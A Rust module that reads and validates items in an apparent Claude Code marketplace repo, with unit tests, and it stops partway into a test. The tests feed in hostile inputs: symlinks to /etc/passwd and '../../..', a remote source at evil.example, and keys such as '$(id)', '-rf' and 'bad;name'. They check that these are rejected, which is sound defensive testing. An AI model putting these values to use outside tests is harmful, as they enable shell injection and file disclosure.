//! Reading a marketplace repo: which items it offers, and the files of one item.
//!
//! Layout (spec §1): `agents/<key>.md`, `skills/<key>/SKILL.md`,
//! `commands/<key>.md`, `hooks/<key>/hook.json`, and `plugins/` as a standard
//! Claude Code marketplace. Every item is validated here — key pattern,
//! symlinks, size and file-count limits, plugin sources that stay inside
//! `plugins/` — so nothing downstream ever sees a name or a file it would
//! have to distrust. A broken item is listed with its reason; it never stops
//! the rest of the repo from loading.

use sha2::{Digest, Sha256};

use crate::marketplace::tree::{describe_size, hex, EntryKind, ReadError, TreeView};
use crate::models::marketplace::{is_valid_item_key, CatalogItem, ItemKind, PluginComponent};

pub const MAX_ITEM_BYTES: u64 = 2 * 1024 * 1024;
pub const MAX_ITEM_FILES: usize = 200;
/// Preview text is truncated to this many bytes (on a char boundary).
const MAX_PREVIEW_BYTES: usize = 64 * 1024;
/// How many directory levels `collect_dir` will descend into an item before
/// giving up on it as invalid. A crafted tree can nest directories far deeper
/// than any real item would (or, over a network `TreeView`, be effectively
/// unbounded), so this is a hard stop rather than a performance nicety.
const MAX_ITEM_DEPTH: usize = 32;
/// `hooks/<key>/hook.json` and `plugins/.claude-plugin/marketplace.json` are
/// parsed as JSON before anything else about the item is known, so they are
/// capped and rejected *unparsed* well below `MAX_ITEM_BYTES` — a bound on
/// the whole item is not a bound on what one `serde_json::from_str` call is
/// asked to chew through.
const MAX_MANIFEST_BYTES: u64 = 1024 * 1024;

const PLUGIN_CATALOG_PATH: &str = "plugins/.claude-plugin/marketplace.json";

/// Hook events Claude Code understands. A `hook.json` naming anything else is
/// invalid rather than silently ignored by Claude Code at runtime.
const HOOK_EVENTS: &[&str] = &[
    "PreToolUse",
    "PostToolUse",
    "PostToolUseFailure",
    "PermissionRequest",
    "Notification",
    "UserPromptSubmit",
    "SessionStart",
    "SessionEnd",
    "Stop",
    "SubagentStart",
    "SubagentStop",
    "PreCompact",
];

/// One file of an item, path relative to the item root (for single-file
/// items: the file name).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ItemFile {
    pub rel_path: String,
    pub data: Vec<u8>,
    pub executable: bool,
}

pub fn hook_dir(key: &str) -> String {
    format!("/home/claude/.claude/triple-c/hooks/{}", key)
}

// ─────────────────────────────────────────────────────────────────────────────
// Parsing helpers
// ─────────────────────────────────────────────────────────────────────────────

/// Minimal YAML front matter: `key: value` lines between leading `---`
/// fences. Returns `(fields, body)`. Quotes around values are stripped. No
/// front matter → no fields, the whole text is the body.
fn front_matter(text: &str) -> (Vec<(String, String)>, &str) {
    let rest = match text
        .strip_prefix("---\n")
        .or_else(|| text.strip_prefix("---\r\n"))
    {
        Some(rest) => rest,
        None => return (Vec::new(), text),
    };
    let mut fields = Vec::new();
    let mut offset = 0;
    for line in rest.split_inclusive('\n') {
        offset += line.len();
        let trimmed = line.trim_end_matches(['\n', '\r']);
        if trimmed == "---" {
            return (fields, &rest[offset..]);
        }
        if let Some((k, v)) = trimmed.split_once(':') {
            let k = k.trim();
            if !k.is_empty() && !k.starts_with(' ') && !line.starts_with(' ') {
                let v = v.trim().trim_matches('"').trim_matches('\'').to_string();
                fields.push((k.to_string(), v));
            }
        }
    }
    // Unterminated front matter: treat the whole file as body.
    (Vec::new(), text)
}

fn field<'a>(fields: &'a [(String, String)], name: &str) -> Option<&'a str> {
    fields
        .iter()
        .find(|(k, _)| k == name)
        .map(|(_, v)| v.as_str())
        .filter(|v| !v.is_empty())
}

fn truncate_preview(text: &str) -> String {
    if text.len() <= MAX_PREVIEW_BYTES {
        return text.to_string();
    }
    let mut cut = MAX_PREVIEW_BYTES;
    while !text.is_char_boundary(cut) {
        cut -= 1;
    }
    format!("{}\n…(truncated)", &text[..cut])
}

/// A UTF-8 file of at most `max_bytes` (checked before it is loaded).
fn read_utf8(tree: &dyn TreeView, path: &str, max_bytes: u64) -> Result<Option<String>, String> {
    match tree.read_file(path, max_bytes)? {
        None => Ok(None),
        Some(bytes) => String::from_utf8(bytes)
            .map(Some)
            .map_err(|_| format!("{} is not UTF-8 text", path)),
    }
}

/// The shared reason a key fails [`is_valid_item_key`], used wherever a name
/// (agent/skill/command/hook/plugin key) is rejected so the wording doesn't
/// drift between the three call sites.
fn invalid_name_reason(key: &str) -> String {
    format!(
        "{:?} is not a valid name (letters, digits, '.', '_' and '-', starting with a letter or digit, at most 64)",
        key
    )
}

/// Reject a git tree entry name that could escape the item root once it is
/// joined into a `/`-separated relative path: `.` and `..` (traversal), an
/// empty name (nothing to join), and any name containing `/`, `\` or a NUL
/// byte (a path separator on this or another OS, or a string terminator in
/// C-based tooling downstream). `TreeView` implementations are trusted to
/// return real entries, but a git tree is repo-controlled content, not
/// something this app authored, so a hostile blob naming a tree entry `..`
/// must not turn into a file written outside the item's own folder.
fn valid_entry_name(name: &str) -> bool {
    !name.is_empty()
        && name != "."
        && name != ".."
        && !name.contains('/')
        && !name.contains('\\')
        && !name.contains('\0')
}

/// Normalise a plugin `source` into a path under `plugins/`, refusing
/// anything that is not a plain relative path staying inside `plugins/`.
fn plugin_source_path(source: &serde_json::Value) -> Result<String, String> {
    let source = source.as_str().ok_or_else(|| {
        "remote plugin sources are not supported — the plugin must live in this repo's plugins/ folder"
            .to_string()
    })?;
    if source.starts_with('/') || source.contains('\\') || source.contains(':') {
        return Err(format!(
            "plugin source {:?} must be a relative path inside plugins/",
            source
        ));
    }
    let mut parts = Vec::new();
    for part in source.split('/') {
        match part {
            "" | "." => {}
            ".." => {
                return Err(format!(
                    "plugin source {:?} must stay inside plugins/",
                    source
                ));
            }
            p => parts.push(p),
        }
    }
    if parts.is_empty() {
        return Err(format!(
            "plugin source {:?} must name a folder inside plugins/",
            source
        ));
    }
    Ok(format!("plugins/{}", parts.join("/")))
}

fn read_plugin_catalog(tree: &dyn TreeView) -> Result<Option<Vec<serde_json::Value>>, String> {
    let Some(text) = read_utf8(tree, PLUGIN_CATALOG_PATH, MAX_MANIFEST_BYTES)? else {
        return Ok(None);
    };
    let json: serde_json::Value = serde_json::from_str(&text)
        .map_err(|e| format!("{} is not valid JSON: {}", PLUGIN_CATALOG_PATH, e))?;
    let plugins = json
        .get("plugins")
        .and_then(|p| p.as_array())
        .ok_or_else(|| format!("{} has no \"plugins\" array", PLUGIN_CATALOG_PATH))?;
    Ok(Some(plugins.clone()))
}

/// Plugins only: the plugin's entry from `plugins/.claude-plugin/marketplace.json`.
pub fn plugin_catalog_entry(tree: &dyn TreeView, key: &str) -> Result<serde_json::Value, String> {
    let entries =
        read_plugin_catalog(tree)?.ok_or_else(|| format!("{} is missing", PLUGIN_CATALOG_PATH))?;
    entries
        .into_iter()
        .find(|e| e.get("name").and_then(|n| n.as_str()) == Some(key))
        .ok_or_else(|| format!("plugin {} is not in {}", key, PLUGIN_CATALOG_PATH))
}

/// Repo path of an item: a file for agents/commands, a folder otherwise.
fn item_path(tree: &dyn TreeView, kind: ItemKind, key: &str) -> Result<String, String> {
    if !is_valid_item_key(key) {
        return Err(invalid_name_reason(key));
    }
    Ok(match kind {
        ItemKind::Agent => format!("agents/{}.md", key),
        ItemKind::Command => format!("commands/{}.md", key),
        ItemKind::Skill => format!("skills/{}", key),
        ItemKind::Hook => format!("hooks/{}", key),
        ItemKind::Plugin => {
            let entry = plugin_catalog_entry(tree, key)?;
            plugin_source_path(entry.get("source").unwrap_or(&serde_json::Value::Null))?
        }
    })
}

/// Recursively collect a folder's files, enforcing the item rules.
///
/// `depth` is how many directory levels below the item root this call is
/// (the root call is `0`); `entries_seen` counts directories *and* files
/// together against [`MAX_ITEM_FILES`] — a tree with few files but many
/// directories is just as much a resource-exhaustion shape as many files,
/// and only counting files would let it through uncapped.
fn collect_dir(
    tree: &dyn TreeView,
    root: &str,
    rel: &str,
    depth: usize,
    entries_seen: &mut usize,
    out: &mut Vec<ItemFile>,
    total: &mut u64,
) -> Result<(), String> {
    if depth > MAX_ITEM_DEPTH {
        return Err(format!(
            "is nested more than {} directories deep",
            MAX_ITEM_DEPTH
        ));
    }
    let path = if rel.is_empty() {
        root.to_string()
    } else {
        format!("{}/{}", root, rel)
    };
    let entries = tree
        .list_dir(&path)?
        .ok_or_else(|| format!("{} is not a folder", path))?;
    for entry in entries {
        if !valid_entry_name(&entry.name) {
            return Err(format!(
                "contains an entry with an invalid name ({:?})",
                entry.name
            ));
        }
        let child_rel = if rel.is_empty() {
            entry.name.clone()
        } else {
            format!("{}/{}", rel, entry.name)
        };
        match entry.kind {
            EntryKind::Symlink => {
                return Err(format!(
                    "contains a symlink ({}), which is not allowed",
                    child_rel
                ));
            }
            EntryKind::Other => {
                return Err(format!(
                    "contains a submodule or special entry ({})",
                    child_rel
                ));
            }
            EntryKind::Dir => {
                *entries_seen += 1;
                if *entries_seen > MAX_ITEM_FILES {
                    return Err(format!("has more than {} files", MAX_ITEM_FILES));
                }
                collect_dir(tree, root, &child_rel, depth + 1, entries_seen, out, total)?
            }
            EntryKind::File => {
                *entries_seen += 1;
                if *entries_seen > MAX_ITEM_FILES {
                    return Err(format!("has more than {} files", MAX_ITEM_FILES));
                }
                // Capped at what is left of the item's budget, so no file
                // bigger than the whole item allows is ever loaded.
                let data = match tree
                    .read_file(&format!("{}/{}", root, child_rel), MAX_ITEM_BYTES - *total)
                {
                    Ok(Some(data)) => data,
                    Ok(None) => return Err(format!("{} vanished while reading", child_rel)),
                    Err(ReadError::TooLarge { .. }) => {
                        return Err(format!("is larger than {}", describe_size(MAX_ITEM_BYTES)))
                    }
                    Err(e) => return Err(e.into()),
                };
                *total += data.len() as u64;
                out.push(ItemFile {
                    rel_path: child_rel,
                    data,
                    executable: entry.executable,
                });
            }
        }
    }
    Ok(())
}

/// Kind of the entry at `path`, looked up through its parent listing.
fn entry_kind(tree: &dyn TreeView, path: &str) -> Result<Option<(EntryKind, bool)>, String> {
    let (parent, name) = match path.rsplit_once('/') {
        Some((p, n)) => (p, n),
        None => ("", path),
    };
    Ok(tree
        .list_dir(parent)?
        .and_then(|entries| entries.into_iter().find(|e| e.name == name))
        .map(|e| (e.kind, e.executable)))
}

/// All files of one item. Err if the item is missing/invalid or breaks the limits.
pub fn item_files(tree: &dyn TreeView, kind: ItemKind, key: &str) -> Result<Vec<ItemFile>, String> {
    let path = item_path(tree, kind, key)?;
    match kind {
        ItemKind::Agent | ItemKind::Command => {
            let (entry, executable) =
                entry_kind(tree, &path)?.ok_or_else(|| format!("{} is missing", path))?;
            match entry {
                EntryKind::File => {}
                EntryKind::Symlink => {
                    return Err(format!("{} is a symlink, which is not allowed", path))
                }
                _ => return Err(format!("{} is not a regular file", path)),
            }
            let data = tree
                .read_file(&path, MAX_ITEM_BYTES)?
                .ok_or_else(|| format!("{} is missing", path))?;
            Ok(vec![ItemFile {
                rel_path: format!("{}.md", key),
                data,
                executable,
            }])
        }
        ItemKind::Skill | ItemKind::Hook | ItemKind::Plugin => {
            match entry_kind(tree, &path)? {
                Some((EntryKind::Dir, _)) => {}
                Some((EntryKind::Symlink, _)) => {
                    return Err(format!("{} is a symlink, which is not allowed", path))
                }
                Some(_) => return Err(format!("{} is not a folder", path)),
                None => return Err(format!("{} is missing", path)),
            }
            let mut out = Vec::new();
            let mut total = 0u64;
            let mut entries_seen = 0usize;
            collect_dir(tree, &path, "", 0, &mut entries_seen, &mut out, &mut total)?;
            let required = match kind {
                ItemKind::Skill => Some("SKILL.md"),
                ItemKind::Hook => Some("hook.json"),
                _ => None,
            };
            if let Some(required) = required {
                if !out.iter().any(|f| f.rel_path == required) {
                    return Err(format!("{} has no {}", path, required));
                }
            }
            Ok(out)
        }
    }
}

/// Content fingerprint for update detection: changes iff the item's files or,
/// for plugins, its catalog entry change. `Ok(None)` when the item is absent.
pub fn item_fingerprint(
    tree: &dyn TreeView,
    kind: ItemKind,
    key: &str,
) -> Result<Option<String>, String> {
    if kind == ItemKind::Plugin {
        let entry = match plugin_catalog_entry(tree, key) {
            Ok(entry) => entry,
            Err(_) => return Ok(None),
        };
        let path = match plugin_source_path(entry.get("source").unwrap_or(&serde_json::Value::Null))
        {
            Ok(path) => path,
            Err(_) => return Ok(None),
        };
        let Some(dir_id) = tree.entry_id(&path)? else {
            return Ok(None);
        };
        let mut hasher = Sha256::new();
        hasher.update(dir_id.as_bytes());
        hasher.update([0]);
        // serde_json's Map is ordered by key (no preserve_order), so this is canonical.
        hasher.update(entry.to_string().as_bytes());
        return Ok(Some(hex(&hasher.finalize())));
    }
    if !is_valid_item_key(key) {
        return Ok(None);
    }
    let path = item_path(tree, kind, key)?;
    tree.entry_id(&path)
}

fn substitute_hook_dir(value: &mut serde_json::Value, dir: &str) {
    match value {
        serde_json::Value::String(s) => {
            if s.contains("${HOOK_DIR}") {
                *s = s.replace("${HOOK_DIR}", dir);
            }
        }
        serde_json::Value::Array(items) => {
            items.iter_mut().for_each(|v| substitute_hook_dir(v, dir))
        }
        serde_json::Value::Object(map) => {
            map.values_mut().for_each(|v| substitute_hook_dir(v, dir))
        }
        _ => {}
    }
}

/// Validate a `hooks` object and return the command strings it runs.
fn validate_hooks(hooks: &serde_json::Value) -> Result<Vec<String>, String> {
    let map = hooks
        .as_object()
        .ok_or_else(|| "\"hooks\" must be an object keyed by event name".to_string())?;
    if map.is_empty() {
        return Err("\"hooks\" is empty".to_string());
    }
    let mut commands = Vec::new();
    for (event, matchers) in map {
        if !HOOK_EVENTS.contains(&event.as_str()) {
            return Err(format!("unknown hook event {:?}", event));
        }
        let matchers = matchers
            .as_array()
            .ok_or_else(|| format!("\"{}\" must be an array", event))?;
        for matcher in matchers {
            let handlers = matcher
                .get("hooks")
                .and_then(|h| h.as_array())
                .ok_or_else(|| format!("each \"{}\" entry needs a \"hooks\" array", event))?;
            for handler in handlers {
                let kind = handler.get("type").and_then(|t| t.as_str()).unwrap_or("");
                if kind.is_empty() {
                    return Err(format!("a \"{}\" hook has no \"type\"", event));
                }
                if kind == "command" {
                    let command = handler
                        .get("command")
                        .and_then(|c| c.as_str())
                        .filter(|c| !c.trim().is_empty())
                        .ok_or_else(|| {
                            format!("a \"{}\" command hook has no \"command\"", event)
                        })?;
                    commands.push(command.to_string());
                }
            }
        }
    }
    Ok(commands)
}

fn read_hook_json(tree: &dyn TreeView, key: &str) -> Result<serde_json::Value, String> {
    let path = format!("hooks/{}/hook.json", key);
    let text = read_utf8(tree, &path, MAX_MANIFEST_BYTES)?
        .ok_or_else(|| format!("{} is missing", path))?;
    serde_json::from_str(&text).map_err(|e| format!("{} is not valid JSON: {}", path, e))
}

/// Hooks only: the parsed `hooks` object with `${HOOK_DIR}` substituted.
pub fn rendered_hook_settings(tree: &dyn TreeView, key: &str) -> Result<serde_json::Value, String> {
    if !is_valid_item_key(key) {
        return Err(format!("{:?} is not a valid hook name", key));
    }
    let json = read_hook_json(tree, key)?;
    let mut hooks = json
        .get("hooks")
        .cloned()
        .ok_or_else(|| format!("hooks/{}/hook.json has no \"hooks\" object", key))?;
    validate_hooks(&hooks)?;
    substitute_hook_dir(&mut hooks, &hook_dir(key));
    Ok(hooks)
}

// ─────────────────────────────────────────────────────────────────────────────
// Catalog
// ─────────────────────────────────────────────────────────────────────────────

fn item(kind: ItemKind, key: &str, path: String) -> CatalogItem {
    CatalogItem {
        kind,
        key: key.to_string(),
        name: key.to_string(),
        description: String::new(),
        path,
        invalid: None,
        hook_commands: Vec::new(),
        preview: String::new(),
        plugin_components: Vec::new(),
    }
}

/// Fill name/description/preview from a markdown file with front matter.
fn describe_markdown(it: &mut CatalogItem, text: &str, first_line_fallback: bool) {
    let (fields, body) = front_matter(text);
    if let Some(name) = field(&fields, "name") {
        it.name = name.to_string();
    }
    if let Some(desc) = field(&fields, "description") {
        it.description = desc.to_string();
    } else if first_line_fallback {
        if let Some(line) = body.lines().map(str::trim).find(|l| !l.is_empty()) {
            it.description = line.trim_start_matches('#').trim().to_string();
        }
    }
    it.preview = truncate_preview(body.trim_start_matches(['\n', '\r']));
}

/// Mark `it` invalid when its files break the rules.
fn validate_files(tree: &dyn TreeView, it: &mut CatalogItem) {
    if it.invalid.is_some() {
        return;
    }
    if let Err(reason) = item_files(tree, it.kind, &it.key) {
        it.invalid = Some(reason);
    }
}

fn parse_single_files(
    tree: &dyn TreeView,
    kind: ItemKind,
    folder: &str,
    out: &mut Vec<CatalogItem>,
) {
    let entries = match tree.list_dir(folder) {
        Ok(Some(entries)) => entries,
        Ok(None) => return,
        Err(e) => {
            let mut it = item(kind, folder, folder.to_string());
            it.invalid = Some(e);
            out.push(it);
            return;
        }
    };
    for entry in entries {
        let Some(stem) = entry.name.strip_suffix(".md") else {
            continue;
        };
        let mut it = item(kind, stem, format!("{}/{}", folder, entry.name));
        if !is_valid_item_key(stem) {
            it.invalid = Some(invalid_name_reason(stem));
            out.push(it);
            continue;
        }
        match entry.kind {
            EntryKind::File => match read_utf8(tree, &it.path, MAX_ITEM_BYTES) {
                Ok(Some(text)) => describe_markdown(&mut it, &text, kind == ItemKind::Command),
                Ok(None) => it.invalid = Some(format!("{} is missing", it.path)),
                Err(e) => it.invalid = Some(e),
            },
            EntryKind::Symlink => {
                it.invalid = Some(format!("{} is a symlink, which is not allowed", it.path))
            }
            _ => it.invalid = Some(format!("{} is not a regular file", it.path)),
        }
        validate_files(tree, &mut it);
        out.push(it);
    }
}

fn parse_folders(tree: &dyn TreeView, kind: ItemKind, folder: &str, out: &mut Vec<CatalogItem>) {
    let entries = match tree.list_dir(folder) {
        Ok(Some(entries)) => entries,
        Ok(None) => return,
        Err(e) => {
            let mut it = item(kind, folder, folder.to_string());
            it.invalid = Some(e);
            out.push(it);
            return;
        }
    };
    for entry in entries {
        if entry.kind == EntryKind::File {
            continue; // e.g. a README.md next to the item folders
        }
        let mut it = item(kind, &entry.name, format!("{}/{}", folder, entry.name));
        if !is_valid_item_key(&entry.name) {
            it.invalid = Some(invalid_name_reason(&entry.name));
            out.push(it);
            continue;
        }
        if entry.kind == EntryKind::Symlink {
            it.invalid = Some(format!("{} is a symlink, which is not allowed", it.path));
            out.push(it);
            continue;
        }
        match kind {
            ItemKind::Skill => {
                match read_utf8(tree, &format!("{}/SKILL.md", it.path), MAX_ITEM_BYTES) {
                    Ok(Some(text)) => describe_markdown(&mut it, &text, false),
                    Ok(None) => it.invalid = Some(format!("{} has no SKILL.md", it.path)),
                    Err(e) => it.invalid = Some(e),
                }
            }
            ItemKind::Hook => match read_hook_json(tree, &entry.name) {
                Ok(json) => {
                    if let Some(name) = json
                        .get("name")
                        .and_then(|n| n.as_str())
                        .filter(|n| !n.is_empty())
                    {
                        it.name = name.to_string();
                    }
                    if let Some(desc) = json.get("description").and_then(|d| d.as_str()) {
                        it.description = desc.to_string();
                    }
                    match rendered_hook_settings(tree, &entry.name) {
                        Ok(hooks) => match validate_hooks(&hooks) {
                            Ok(commands) => it.hook_commands = commands,
                            Err(e) => it.invalid = Some(e),
                        },
                        Err(e) => it.invalid = Some(e),
                    }
                }
                Err(e) => it.invalid = Some(e),
            },
            _ => {}
        }
        validate_files(tree, &mut it);
        out.push(it);
    }
}

/// Keys of a plugin's catalog entry or `plugin.json` that make Claude Code
/// run something or add commands.
const PLUGIN_RUNNABLE_KEYS: &[&str] = &["hooks", "mcpServers", "lspServers", "commands"];
/// Of those, the keys whose value may instead be a path (or a list of paths)
/// to a JSON file inside the plugin, which is then what runs.
const PLUGIN_PATH_KEYS: &[&str] = &["hooks", "mcpServers", "lspServers"];
/// Files in a plugin's root folder that declare what it runs.
const PLUGIN_RUNNABLE_FILES: &[&str] = &["hooks/hooks.json", ".mcp.json", ".lsp.json"];

/// A path a plugin gives for one of its own files, as a path relative to the
/// plugin root; refused unless it stays inside the plugin folder.
fn plugin_relative_path(value: &str) -> Result<String, String> {
    let outside = || format!("{:?} points outside the plugin folder", value);
    if value.starts_with('/') || value.contains('\\') || value.contains(':') {
        return Err(outside());
    }
    let mut parts = Vec::new();
    for part in value.split('/') {
        match part {
            "" | "." => {}
            ".." => return Err(outside()),
            p => parts.push(p),
        }
    }
    if parts.is_empty() {
        return Err(format!("{:?} does not name a file in the plugin", value));
    }
    Ok(parts.join("/"))
}

/// The component, shown whole: a runnable manifest cut short could hide a
/// hook (round 2), so anything over the manifest cap refuses the plugin.
fn whole_component(label: String, content: String) -> Result<PluginComponent, String> {
    if content.len() as u64 > MAX_MANIFEST_BYTES {
        return Err(format!(
            "{} is larger than {} and cannot be shown for review",
            label,
            describe_size(MAX_MANIFEST_BYTES)
        ));
    }
    Ok(PluginComponent { label, content })
}

/// A plugin file, whole; missing or oversized files refuse the plugin.
fn plugin_file(tree: &dyn TreeView, root: &str, rel: &str) -> Result<Option<String>, String> {
    read_utf8(tree, &format!("{}/{}", root, rel), MAX_MANIFEST_BYTES)
        .map_err(|e| e.replacen(&format!("{}/", root), "", 1))
}

fn runnable_fields(
    tree: &dyn TreeView,
    root: &str,
    label: &str,
    json: &serde_json::Value,
    out: &mut Vec<PluginComponent>,
) -> Result<(), String> {
    for key in PLUGIN_RUNNABLE_KEYS {
        let Some(value) = json.get(key) else {
            continue;
        };
        let paths: Option<Vec<&str>> = match value {
            serde_json::Value::String(p) => Some(vec![p.as_str()]),
            serde_json::Value::Array(items) if items.iter().all(|v| v.is_string()) => {
                Some(items.iter().filter_map(|v| v.as_str()).collect())
            }
            _ => None,
        };
        match paths {
            Some(paths) if PLUGIN_PATH_KEYS.contains(key) => {
                for path in paths {
                    let rel = plugin_relative_path(path)
                        .map_err(|e| format!("{}: {} {}", label, key, e))?;
                    let text = plugin_file(tree, root, &rel)?.ok_or_else(|| {
                        format!(
                            "{}: {} names {}, which is not in the plugin",
                            label, key, rel
                        )
                    })?;
                    out.push(whole_component(
                        format!("{}: {} → {}", label, key, rel),
                        text,
                    )?);
                }
            }
            _ => out.push(whole_component(
                format!("{}: {}", label, key),
                serde_json::to_string_pretty(value).unwrap_or_default(),
            )?),
        }
    }
    Ok(())
}

/// What a plugin brings that can run (PR review #4, round 2): its catalog
/// entry's and `plugin.json`'s hooks / MCP / LSP servers / commands — with
/// path-valued ones resolved inside the plugin and shown as the files they
/// name — the folder's `hooks/hooks.json`, `.mcp.json` and `.lsp.json`, and
/// `commands/`. Everything is shown whole; an `Err` makes the plugin
/// invalid, since it could not be reviewed.
fn plugin_components(
    tree: &dyn TreeView,
    entry: &serde_json::Value,
    root: &str,
) -> Result<Vec<PluginComponent>, String> {
    let mut out = Vec::new();
    runnable_fields(tree, root, "marketplace.json entry", entry, &mut out)?;
    if let Some(text) = plugin_file(tree, root, ".claude-plugin/plugin.json")? {
        let json: serde_json::Value = serde_json::from_str(&text)
            .map_err(|e| format!(".claude-plugin/plugin.json is not valid JSON: {}", e))?;
        runnable_fields(tree, root, ".claude-plugin/plugin.json", &json, &mut out)?;
    }
    for file in PLUGIN_RUNNABLE_FILES {
        if let Some(text) = plugin_file(tree, root, file)? {
            out.push(whole_component(file.to_string(), text)?);
        }
    }
    if let Ok(Some(children)) = tree.list_dir(&format!("{}/commands", root)) {
        out.push(PluginComponent {
            label: "commands/".to_string(),
            content: children
                .iter()
                .map(|c| c.name.clone())
                .collect::<Vec<_>>()
                .join("\n"),
        });
    }
    Ok(out)
}

fn parse_plugins(tree: &dyn TreeView, out: &mut Vec<CatalogItem>) {
    let entries = match read_plugin_catalog(tree) {
        Ok(Some(entries)) => entries,
        Ok(None) => return,
        Err(e) => {
            let mut it = item(ItemKind::Plugin, "catalog", PLUGIN_CATALOG_PATH.to_string());
            it.name = PLUGIN_CATALOG_PATH.to_string();
            it.invalid = Some(e);
            out.push(it);
            return;
        }
    };
    for entry in entries {
        let key = entry
            .get("name")
            .and_then(|n| n.as_str())
            .unwrap_or("")
            .to_string();
        let mut it = item(ItemKind::Plugin, &key, PLUGIN_CATALOG_PATH.to_string());
        if let Some(desc) = entry.get("description").and_then(|d| d.as_str()) {
            it.description = desc.to_string();
        }
        if !is_valid_item_key(&key) {
            it.invalid = Some(format!("plugin name {:?} is not a valid name", key));
            out.push(it);
            continue;
        }
        match plugin_source_path(entry.get("source").unwrap_or(&serde_json::Value::Null)) {
            Ok(path) => {
                it.path = path.clone();
                if let Ok(Some(children)) = tree.list_dir(&path) {
                    it.preview = children
                        .iter()
                        .map(|c| {
                            if c.kind == EntryKind::Dir {
                                format!("{}/", c.name)
                            } else {
                                c.name.clone()
                            }
                        })
                        .collect::<Vec<_>>()
                        .join("\n");
                }
                match plugin_components(tree, &entry, &path) {
                    Ok(components) => it.plugin_components = components,
                    Err(e) => it.invalid = Some(e),
                }
            }
            Err(e) => it.invalid = Some(e),
        }
        validate_files(tree, &mut it);
        out.push(it);
    }
}

/// Parse every item in the repo. Never fails as a whole; broken items carry `invalid`.
/// Order: agents, skills, commands, hooks, plugins; each in listing order.
pub fn parse_catalog(tree: &dyn TreeView) -> Vec<CatalogItem> {
    let mut out = Vec::new();
    parse_single_files(tree, ItemKind::Agent, "agents", &mut out);
    parse_folders(tree, ItemKind::Skill, "skills", &mut out);
    parse_single_files(tree, ItemKind::Command, "commands", &mut out);
    parse_folders(tree, ItemKind::Hook, "hooks", &mut out);
    parse_plugins(tree, &mut out);
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::marketplace::tree::MemTree;

    const HOOK_JSON: &str = r#"{
        "name": "notify-on-stop",
        "description": "Ping when Claude stops",
        "hooks": { "Stop": [ { "hooks": [ { "type": "command", "command": "${HOOK_DIR}/notify.sh" } ] } ] }
    }"#;

    const PLUGIN_CATALOG: &str = r#"{
        "name": "example",
        "owner": { "name": "t" },
        "plugins": [
            { "name": "example-plugin", "source": "./example-plugin", "description": "Adds a skill" }
        ]
    }"#;

    fn full_repo() -> MemTree {
        MemTree::new()
            .file("README.md", "# repo")
            .file(
                "agents/code-reviewer.md",
                "---\nname: code-reviewer\ndescription: Reviews diffs\n---\nYou review code.\n",
            )
            .file(
                "skills/example-skill/SKILL.md",
                "---\nname: example-skill\ndescription: \"Says hi\"\n---\nSay hi.\n",
            )
            .file("skills/example-skill/ref/notes.md", "notes")
            .file(
                "commands/example-command.md",
                "# Summarise the branch\n\nDo it.\n",
            )
            .file("hooks/notify-on-stop/hook.json", HOOK_JSON)
            .exec_file("hooks/notify-on-stop/notify.sh", "#!/bin/sh\necho done\n")
            .file("plugins/.claude-plugin/marketplace.json", PLUGIN_CATALOG)
            .file(
                "plugins/example-plugin/.claude-plugin/plugin.json",
                r#"{"name":"example-plugin"}"#,
            )
            .file(
                "plugins/example-plugin/skills/hello/SKILL.md",
                "---\nname: hello\n---\nhi",
            )
    }

    #[test]
    fn parses_every_kind() {
        let items = parse_catalog(&full_repo());
        let summary: Vec<_> = items
            .iter()
            .map(|i| (i.kind, i.key.as_str(), i.invalid.as_deref()))
            .collect();
        assert_eq!(
            summary,
            vec![
                (ItemKind::Agent, "code-reviewer", None),
                (ItemKind::Skill, "example-skill", None),
                (ItemKind::Command, "example-command", None),
                (ItemKind::Hook, "notify-on-stop", None),
                (ItemKind::Plugin, "example-plugin", None),
            ]
        );
        assert_eq!(items[0].description, "Reviews diffs");
        assert_eq!(items[0].preview, "You review code.\n");
        assert_eq!(items[1].description, "Says hi");
        assert_eq!(items[2].description, "Summarise the branch");
        assert_eq!(items[3].name, "notify-on-stop");
        assert_eq!(
            items[3].hook_commands,
            vec!["/home/claude/.claude/triple-c/hooks/notify-on-stop/notify.sh".to_string()]
        );
        assert_eq!(items[4].path, "plugins/example-plugin");
        assert_eq!(items[4].preview, ".claude-plugin/\nskills/");
    }

    #[test]
    fn an_empty_repo_has_no_items() {
        assert!(parse_catalog(&MemTree::new().file("README.md", "x")).is_empty());
    }

    #[test]
    fn name_falls_back_to_the_file_stem() {
        let t = MemTree::new().file("agents/plain.md", "no front matter here");
        let items = parse_catalog(&t);
        assert_eq!(items[0].name, "plain");
        assert_eq!(items[0].description, "");
        assert!(items[0].invalid.is_none());
    }

    #[test]
    fn rejects_symlink_items() {
        let t = MemTree::new()
            .symlink("agents/evil.md", "/etc/passwd")
            .file("skills/s/SKILL.md", "x")
            .symlink("skills/s/link", "../../..")
            .symlink("hooks/h", "../skills/s");
        let items = parse_catalog(&t);
        assert_eq!(items.len(), 3);
        for it in &items {
            let reason = it
                .invalid
                .as_deref()
                .unwrap_or_else(|| panic!("{} should be invalid", it.key));
            assert!(reason.contains("symlink"), "{}: {}", it.key, reason);
        }
        assert!(item_files(&t, ItemKind::Skill, "s").is_err());
    }

    #[test]
    fn rejects_escaping_plugin_source() {
        for source in [
            r#""../outside""#,
            r#""./a/../../b""#,
            r#""/abs""#,
            r#""https://evil.example/x.git""#,
            r#"{"source":"github","repo":"x/y"}"#,
            r#""""#,
        ] {
            let catalog = format!(r#"{{"plugins":[{{"name":"p","source":{}}}]}}"#, source);
            let t = MemTree::new()
                .file("plugins/.claude-plugin/marketplace.json", &catalog)
                .file("plugins/p/x.md", "x")
                .file("outside/x.md", "x");
            let items = parse_catalog(&t);
            assert!(
                items[0].invalid.is_some(),
                "source {} should be refused",
                source
            );
            assert!(item_files(&t, ItemKind::Plugin, "p").is_err());
        }
    }

    #[test]
    fn rejects_bad_keys() {
        let t = MemTree::new()
            .file("agents/-rf.md", "x")
            .file("agents/a b.md", "x")
            .file("skills/$(id)/SKILL.md", "x")
            .file(
                "plugins/.claude-plugin/marketplace.json",
                r#"{"plugins":[{"name":"bad;name","source":"./p"}]}"#,
            )
            .file("plugins/p/x", "x");
        let items = parse_catalog(&t);
        assert_eq!(items.len(), 4);
        assert!(items.iter().all(|i| i.invalid.is_some()), "{:?}", items);
        assert!(item_files(&t, ItemKind::Agent, "-rf").is_err());
        assert!(item_files(&t, ItemKind::Skill, "$(id)").is_err());
        assert!(item_files(&t, ItemKind::Agent, "../x").is_err());
    }

    #[test]
    fn enforces_item_limits() {
